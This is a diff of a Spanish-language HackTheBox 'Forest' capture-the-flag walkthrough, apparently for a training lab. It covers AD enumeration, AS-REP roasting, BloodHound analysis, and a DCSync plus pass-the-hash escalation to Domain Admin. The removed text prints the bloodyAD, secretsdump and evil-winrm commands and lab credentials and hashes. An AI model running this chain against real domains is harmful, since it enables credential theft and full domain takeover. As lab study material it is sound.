@@ -1,261 +1,203 @@
 # HackTheBox - Forest
 
 ## Task 1
-**Reconocimiento inicial - escaneo de puertos y descubrimiento del dominio**
+**For which domain is this machine a Domain Controller?**
 
-Empezamos con un escaneo completo de puertos para identificar los servicios expuestos por el objetivo.
+Primero como siempre enumeramos con nmap para ver que puertos tiene abiertos la máquina. Aqui ya podemos fijarnos que seguramente hay un DC debido a los puertos abiertos y los servicios que corren en ellos: 53:UDP, 88:Kerberos, 389:LDAP, 445:SMB, 3268:CATLOG_LDAP, 5985:WinRM
 
-```bash
-nmap -p- --open -sS --min-rate 5000 -Pn 10.129.95.210
-```
+![nmap](images/namp.png)
 
-![Escaneo completo de nmap](images/task1-nmap-full-scan.png)
+Al ver que tenemos el puerto de SMB intentamos enumerarlo.
 
-El resultado muestra los puertos típicos de un controlador de dominio Active Directory: **Kerberos (88)**, **LDAP (389/636/3268/3269)**, **SMB (445)**, **WinRM (5985)**, entre otros. Esto confirma que el objetivo es un Domain Controller.
+![Intento de enumeración SMB](images/2_intento_smb_enum.png)
 
-A continuación usamos `netexec` (antes CrackMapExec) para obtener información básica del dominio sin autenticarnos:
+Sin credenciales no podemos aceder a nada.
 
-```bash
-netexec smb 10.129.95.210
-```
+Después de la primera enumeración con Nmap, observamos varios servicios relacionados con Active Directory, como DNS, Kerberos, LDAP y SMB, por lo que podemos sospechar que estamos ante un Domain Controller.
 
-![netexec - descubrimiento del dominio](images/task1-netexec.png)
+Para confirmar esta información y obtener el nombre del dominio podemos utilizar diferentes herramientas. En este caso utilizaremos dos métodos:
 
-La salida nos confirma el nombre del dominio (**htb.local**), el nombre de host (**FOREST**) y detalles como que la firma SMB está activa.
+NetExec realiza una conexión contra el servicio SMB y obtiene información que Windows expone durante la negociación, como el hostname de la máquina, el dominio asociado y el sistema operativo.
 
-También confirmamos el nombre del dominio vía LDAP:
+En la salida podemos observar:
 
-```bash
-nmap -p389 --script ldap-rootdse 10.129.95.210
-```
+- Hostname: FOREST
+- Dominio: htb.local
 
-![nmap ldap-rootdse - nombre del dominio](images/task1-nmap-domain.png)
+![NetExec - nombre del dominio](images/task1_netexec_domain_name.png)
 
-Con esto confirmamos el `namingContext` (`DC=htb,DC=local`) y el nombre del controlador de dominio (`FOREST`).
+![nmap ldap-rootdse - nombre del dominio](images/task1_nmap_domain_name.png)
+
+Una de las formas de obtener información básica del dominio es consultando el servicio LDAP mediante el script `ldap-rootdse` de Nmap. Que devuelve lo mismo que utilizando la herramienta ldapsearch y preguntando por los datos basicos al dominio.
 
 ---
 
 ## Task 2
-**Enumeración de usuarios del dominio**
+**Which of the following services allows for anonymous authentication and can provide us with valuable information about the machine? FTP, LDAP, SMB, WinRM**
 
-Probamos primero acceso anónimo por SMB:
-
-```bash
-smbclient -L //10.129.95.210 -N
-```
-
-![smbclient anónimo](images/task2-smbclient-anon.png)
-
-El login anónimo tiene éxito pero no se listan shares útiles directamente por este medio.
-
-Pasamos a enumerar usuarios del dominio vía LDAP anónimo:
+Aqui como hemos visto antenriormente SMB no lo permite. Y también al ejecutar el nmap con el script ldap-rootsde he comparado salidas con el ldapsearch
 
 ```bash
-ldapsearch -x -H ldap://10.129.95.210 \
--b "DC=htb,DC=local" \
-"(objectClass=user)" sAMAccountName | grep "^sAMAccountName:" | cut -d " " -f2
+ldapsearch -x -H ldap://10.129.95.210 -s base
 ```
 
-![Enumeración LDAP de usuarios](images/task2-ldap-enum-users.png)
+Y la salida exitoso nos dice si que da información útil de la máquina.
 
-Esto nos devuelve una lista completa de usuarios del dominio, incluyendo cuentas de servicio (`HealthMailbox*`, cuentas `SM_*`) y usuarios "reales": `sebastien`, `lucinda`, `andy`, `mark`, `santi`.
-
-Filtrando el ruido, confirmamos también la presencia de la cuenta de servicio **svc-alfresco**:
-
-![svc-alfresco en la enumeración LDAP](images/task2-ldap-enum-alfresco.png)
-
-Con los usuarios "reales" identificados, creamos un archivo de texto para usarlo como lista de usuarios en los siguientes ataques:
-
-![Creando la lista de usuarios](images/task2-creating-userlist.png)
-
-```text
-sebastien
-lucinda
-andy
-mark
-santi
-Administrator
-Guest
-```
-
-![user.txt final](images/task2-userlist-final.png)
+*No pongo captura por que literalmente es la de nmap con el script de ldap*
 
 ---
 
 ## Task 3
-**AS-REP Roasting - obtención de credenciales de svc-alfresco**
+**Which user has Kerberos Pre-Authentication disabled?**
 
-Con la lista de usuarios preparada, buscamos cuentas que tengan deshabilitado el requisito de pre-autenticación Kerberos (`UF_DONT_REQUIRE_PREAUTH`), lo que las hace vulnerables a **AS-REP Roasting**:
+Lo primero que tenemos que hacer para ver que usuario tiene desactivado el pre-auth es saber que usuarios existen en el dominio.
+
+Primero intento hacerlo directo, con un filtro LDAP que busca usuarios con el flag DONT_REQUIRE_PREAUTH activado en userAccountControl (la regla 1.2.840.113556.1.4.803 es una comprobación bit a bit sobre ese atributo):
+
+![Primer intento](images/task2_el_churro_no_me_funciona.png)
+
+Este churro busca exactamente eso: usuarios con pre-auth desactivado, filtrando directamente por el bit correspondiente en userAccountControl. El problema es que el bind anónimo por LDAP nos deja hacer consultas básicas (como el rootDSE que vimos en la Task 2), pero no tiene permisos suficientes para evaluar un filtro de este tipo sobre el árbol completo de usuarios — por eso devuelve 0 Success sin resultados, aunque la sintaxis esté bien.
+
+Como la vía directa no funciona, probamos a enumerar usuarios de forma más simple, pidiendo solo el atributo sAMAccountName sin filtros complejos:
+
+![usuarios](images/task2_vamos_a_crear_users.txt.png)
+
+Esta consulta sí que la permite el bind anónimo, porque es una lectura simple de un atributo, no una evaluación de bit a nivel de todo el árbol. Con esto sacamos la lista completa de usuarios del dominio (incluyendo cuentas de servicio con nombres raros tipo HealthMailbox*).
+
+Filtrando el ruido, montamos un user.txt con los usuarios que parecen reales:
+
+![Creando la lista](images/task2_user.txt_creado.png)
+
+Metemos también Administrator y Guest por si acaso, aunque sabemos que probablemente no van a ser vulnerables.
+
+Con esta lista corremos GetNPUsers para buscar quién tiene el pre-auth desactivado, pero no encuentra nada — ninguno de estos usuarios es vulnerable. Así que cambiamos de vía y probamos a enumerar usuarios por RPC:
 
 ```bash
-impacket-GetNPUsers htb.local/ -usersfile user.txt -dc-ip 10.129.95.210
+rpcclient -U "" -N 10.129.95.210
+rpcclient $> enumdomusers
 ```
 
-![AS-REP Roasting - hash de svc-alfresco](images/task3-asrep-hash-alfresco.png)
+![aqui esta alfresco](images/task2_aqui_esta_alfresco!!.png)
 
-La mayoría de usuarios no son vulnerables, pero **svc-alfresco** sí lo es, y obtenemos su hash `$krb5asrep$23$svc-alfresco@HTB.LOCAL...`.
+Con svc-alfresco ya en nuestra lista, volvemos a correr GetNPUsers y esta vez sí conseguimos el hash AS-REP:
 
-Guardamos el hash y lo crackeamos offline con Hashcat:
 
-```bash
-hashcat -m 18200 asrep-hash.txt rockyou.txt
-```
-
-Como resultado obtenemos la contraseña en texto plano de **svc-alfresco**: `s3rvice`.
+![Hash de svc-alfresco](images/task3_alfesco_hash.png)
 
 ---
 
 ## Task 4
-**Verificación de acceso con las credenciales obtenidas**
+**What is the password of the user svc-alfresco?**
 
-Con las credenciales `svc-alfresco:s3rvice`, confirmamos que el usuario tiene acceso remoto vía WinRM:
 
-```bash
-evil-winrm -i 10.129.95.210 -u svc-alfresco -p s3rvice
-```
 
-![Acceso WinRM como svc-alfresco](images/task5-evilwinrm-alfresco.png)
+Despues de utilizar herramientas como hashcat o john ripper logramos sacar la contraseña:
 
-Esto nos da una shell interactiva en la máquina como `svc-alfresco`, confirmando el punto de entrada al dominio.
+s3rvice
 
 ---
 
 ## Task 5
-**Recolección de datos con BloodHound**
+**To what port can we connect with these creds to get an interactive shell?**
 
-Para mapear las relaciones de privilegios del dominio, usamos `bloodhound-python` con las credenciales de `svc-alfresco`:
+Aqui volvemos a mirar NMAP vemos que nuestro puerto de WinRM está abierto (5985)
 
-```bash
-bloodhound-python \
--u svc-alfresco \
--p 's3rvice' \
--d htb.local \
--c All \
--ns 10.129.95.210 \
---zip
-```
+intentamos conectarnos remotamente con evil-WinRM
 
-![Recolección de datos con BloodHound](images/task6-bloodhound-ingest.png)
-
-Esto genera un `.zip` con toda la información del dominio (usuarios, grupos, computadoras, ACLs, sesiones, etc.), listo para subir a BloodHound CE vía **File Ingest**.
+![evil-winrm](images/Task5_WinRM_evil.png)
 
 ---
 
 ## Task 6
-**Análisis en BloodHound - camino de escalada de privilegios**
+**Submit the flag located on the svc-alfresco user's desktop.**
 
-Al analizar los grupos de los que `svc-alfresco` es miembro (directa e indirectamente), encontramos la siguiente cadena:
+Navegar al escritorio y mirar la flag, no hay que hacer "nada"
 
-![Cadena de grupos de svc-alfresco](images/task6-grupos-alfresco.png)
+---
+
+## Task 7
+**Which group has WriteDACL permissions over the HTB.LOCAL domain? Give the group name without the `@htb.local`.**
+
+
+Con las credenciales de svc-alfresco ya podemos autenticarnos en el dominio, así que recolectamos toda la información de Active Directory con BloodHound:
+```bash
+bloodhound-python -u svc-alfresco -p 's3rvice' -d htb.local -c All -ns 10.129.95.210 --zip
+```
+
+![Recolección de datos con BloodHound](images/task6_Bloodhound.png)
+
+Esto genera un .zip con usuarios, grupos, permisos y relaciones del dominio. Lo subimos a BloodHound (interfaz web) para analizarlo visualmente.
+Buscamos el nodo del dominio HTB.LOCAL y miramos qué grupos u objetos tienen permisos de control sobre él ("Inbound Object Control"):
+
+![Grafo completo de controladores sobre HTB.LOCAL](images/Task6_htb.local.png)
+
+Aquí aparecen varias relaciones distintas (WriteOwner, GenericAll, GetChanges, etc.), pero la que nos interesa es WriteDacl, porque es la que da acceso a modificar los permisos del propio dominio. Revisando cada relación una por una, encontramos que el grupo Exchange Windows Permissions tiene un WriteDacl directo (no heredado) sobre el objeto dominio:
+
+![WriteDacl de Exchange Windows Permissions sobre HTB.LOCAL](images/Task6_respuesta.png)
+
+Esto es una mala configuración conocida: por defecto, ciertos grupos relacionados con Exchange reciben permisos elevados sobre el dominio para poder gestionar cosas como los buzones de correo, y eso se traduce en un WriteDacl que no debería existir con tanta libertad.
+
+---
+
+## Task 8
+**The user svc-alfresco is a member of a group that allows them to add themself to the "Exchange Windows Permissions" group. Which group is that?**
+
+Mirando en BloodHound los grupos de los que `svc-alfresco` es miembro (directa o indirectamente), vemos esta cadena:
+
+![Cadena de grupos de svc-alfresco](images/Task6_grupos_alfresco.png)
 
 `svc-alfresco` → `Service Accounts` → `Privileged IT Accounts` → **`Account Operators`**
 
-**Account Operators** es un grupo privilegiado de Active Directory cuyos miembros pueden crear y modificar usuarios, y añadirlos a grupos no protegidos (sin `adminCount=1`).
+**Account Operators** es un grupo integrado de Active Directory con privilegios especiales: sus miembros pueden crear y modificar cuentas de usuario, y añadirlas a grupos que no estén "protegidos" (es decir, grupos que no tengan el atributo `adminCount=1`, como Domain Admins).
 
-### Which group has WriteDACL permissions over the HTB.LOCAL domain?
+Como `Exchange Windows Permissions` no es un grupo protegido, `svc-alfresco`, gracias a ser miembro de `Account Operators`, puede añadirse a sí mismo directamente a ese grupo sin necesitar más permisos.
 
-Visualizando el nodo del dominio `HTB.LOCAL` y sus "Inbound Object Control", vemos varias relaciones de control:
-
-![Grafo completo de controladores sobre HTB.LOCAL](images/task6-htb-local-graph.png)
-
-Analizando cada relación específica, confirmamos que el grupo **Exchange Windows Permissions** tiene una relación **WriteDacl** directa (no heredada) sobre el objeto dominio:
-
-![WriteDacl de Exchange Windows Permissions sobre HTB.LOCAL](images/task6-writedacl-exchange.png)
-
-**Respuesta: `EXCHANGE WINDOWS PERMISSIONS`**
-
-### Which group allows svc-alfresco to add itself to "Exchange Windows Permissions"?
-
-Como `svc-alfresco` es miembro de **Account Operators**, y este grupo puede modificar la membresía de grupos no protegidos, puede añadirse a sí mismo a `Exchange Windows Permissions` (que no está protegido por AdminSDHolder).
-
-**Respuesta: `ACCOUNT OPERATORS`**
-
-### ¿Qué ataque permite escalar privilegios con WriteDACL sobre el dominio?
-
-Con `WriteDacl` sobre el objeto dominio se puede modificar su ACL para otorgarse los derechos extendidos de replicación (`DS-Replication-Get-Changes` y `DS-Replication-Get-Changes-All`), lo que permite ejecutar un ataque **DCSync**.
-
-**Respuesta: `DCSync`**
 
 ---
 
-## Task Final
-**Explotación - de svc-alfresco a Domain Admin**
+## Task 9
+**Which of the following attacks you can perform to elevate your privileges with a user that has WriteDACL on the domain? PassTheHash, PassTheTicket, DCSync, KrbRelay**
 
-### Paso 1 - Añadir a svc-alfresco al grupo Exchange Windows Permissions
 
-Verificamos primero el estado inicial del grupo:
+La respuesta es **DCSync**, y la razón es esta:
 
-```bash
-net rpc group members "Exchange Windows Permissions" -U htb.local/svc-alfresco%'s3rvice' -S 10.129.95.210
-```
+`WriteDacl` sobre el dominio significa que puedes modificar la lista de permisos (ACL) del propio objeto dominio. O sea, puedes añadirte a ti mismo un permiso nuevo que antes no tenías. En concreto, puedes darte los permisos de replicación (`DS-Replication-Get-Changes` y `DS-Replication-Get-Changes-All`), que son justo los que necesita un Domain Controller para "pedirle" a otro DC que le mande copias de las contraseñas de los usuarios durante la replicación normal del dominio.
 
-![Estado inicial del grupo](images/taskfinal-check-group-before.png)
+Si te das esos permisos a ti mismo, el controlador de dominio no distingue entre tú y un DC de verdad pidiendo esa información — así que te la da igual. Eso es exactamente lo que hace un ataque **DCSync**: hacerte pasar por un DC para que te "repliquen" las contraseñas, sin necesitar acceso directo a la máquina.
 
-Solo aparece `Exchange Trusted Subsystem` como miembro. Usamos `bloodyAD`, apoyándonos en los privilegios de `Account Operators`, para añadir a `svc-alfresco`:
+Por qué no son las otras:
 
-```bash
-bloodyAD --host 10.129.95.210 -d htb.local -u svc-alfresco -p 's3rvice' \
-add groupMember "Exchange Windows Permissions" svc-alfresco
-```
+- **Pass the Hash**: sirve para autenticarte usando un hash NTLM que ya tienes, en vez de la contraseña en texto plano. No tiene nada que ver con permisos de ACL — aquí todavía no tenemos ningún hash, así que no aplica en este punto.
+- **Pass the Ticket**: parecido al anterior pero con tickets Kerberos (TGT/TGS) en vez de hashes. Tampoco tiene relación con modificar permisos del dominio.
+- **KrbRelay**: es un ataque de relay de autenticación Kerberos (aprovechar una autenticación de otro para colarte en un servicio). Ninguna parte de este ataque implica tocar la ACL del dominio.
 
-Verificamos de nuevo que el cambio se aplicó correctamente:
+Solo `WriteDacl` te da la capacidad de **modificar permisos**, y el único ataque de la lista que se basa en aprovechar ese cambio de permisos es **DCSync**.
+t7
 
-![Usuario añadido y verificado en el grupo](images/taskfinal-add-group-verified.png)
-
-### Paso 2 - Otorgarse derechos de DCSync
-
-Con `svc-alfresco` ya dentro de `Exchange Windows Permissions` (que tiene WriteDacl sobre el dominio), modificamos la ACL del dominio para concedernos los derechos de replicación:
-
-```bash
-bloodyAD --host 10.129.95.210 -d htb.local -u svc-alfresco -p 's3rvice' \
-add dcsync svc-alfresco
-```
-
-![Derechos de DCSync concedidos](images/taskfinal-dcsync-grant.png)
-
-### Paso 3 - Ejecutar el ataque DCSync
-
-Con los derechos de replicación concedidos, usamos `secretsdump.py` de Impacket para volcar el hash NTLM del Administrator:
-
-```bash
-impacket-secretsdump htb.local/svc-alfresco:'s3rvice'@10.129.95.210 -just-dc-user Administrator
-```
-
-![Hash del Administrator obtenido vía DCSync](images/taskfinal-secretsdump-hash.png)
-
-Obtenemos el hash NTLM del Administrador del dominio:
-
-```
-htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
-```
-
-### Paso 4 - Pass-the-Hash y captura de la flag
-
-Con el hash NTLM, iniciamos sesión directamente como Administrator sin necesitar la contraseña en texto plano:
-
-```bash
-evil-winrm -i 10.129.95.210 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
-```
-
-![Acceso como Administrator y root.txt](images/taskfinal-root-flag.png)
-
-Con control total del Domain Controller, navegamos hasta el escritorio del Administrator y leemos la flag final:
-
-```powershell
-cat ../Desktop/root.txt
-```
-
-**Máquina Forest completada.**
 
 ---
 
-## Resumen del camino de ataque
+## Submit Root Flag
+**Submit the flag located on the administrator's desktop.**
 
-1. Enumeración de usuarios del dominio vía LDAP anónimo.
-2. AS-REP Roasting → contraseña en texto plano de `svc-alfresco` (`s3rvice`).
-3. Recolección de datos de BloodHound con las credenciales de `svc-alfresco`.
-4. Identificación de la cadena: `svc-alfresco` → `Account Operators` → puede modificar `Exchange Windows Permissions` → este grupo tiene `WriteDacl` sobre el dominio.
-5. Auto-inclusión en `Exchange Windows Permissions` con `bloodyAD`.
-6. Concesión de derechos de DCSync sobre el dominio con `bloodyAD`.
-7. Ejecución de DCSync con `secretsdump.py` → hash NTLM del Administrator.
-8. Pass-the-Hash con `evil-winrm` → shell como Administrator → root.txt.
+Lo primero que tenemos que hacer es mirar en que grupos se encuentra alfresco
+
+![Estado inicial del grupo](images/Taskfinal_comprobacion_grupo.png)
+
+
+Tras comprometer la cuenta svc-alfresco, se aprovecharon los privilegios delegados sobre Exchange para añadir el usuario al grupo Exchange Windows Permissions utilizando bloodyAD. La pertenencia a este grupo permitió modificar permisos dentro del dominio, paso necesario para otorgar posteriormente los privilegios de DCSync.
+
+![Usuario añadido y verificado en el grupo](images/Taskfinal_añadido_comprobado.png)
+
+Una vez comprometida la cuenta svc-alfresco, se le asignaron permisos de DCSync sobre el dominio. Esta técnica permite a un usuario con los privilegios adecuados solicitar al controlador de dominio la replicación de credenciales, simulando el comportamiento de un Domain Controller.
+
+
+![Derechos de DCSync concedidos](images/TaskFinal_DCSYNC.png)
+
+Con los permisos DCSync ya asignados, se utilizó secretsdump.py para replicar las credenciales del dominio y obtener el hash NTLM del usuario Administrator. Este hash sería utilizado posteriormente para autenticarse sin conocer la contraseña en texto plano.
+![Hash del Administrator obtenido vía DCSync](images/Task_final_hash.png)
+
+Finalmente, se realizó un ataque Pass-the-Hash mediante Evil-WinRM, autenticándose como Administrator utilizando el hash obtenido anteriormente. Tras acceder al sistema con privilegios máximos, se leyó el archivo root.txt, completando con éxito la máquina.
+
+![Acceso como Administrator y root.txt](images/Taskfinal_flag.png)
+
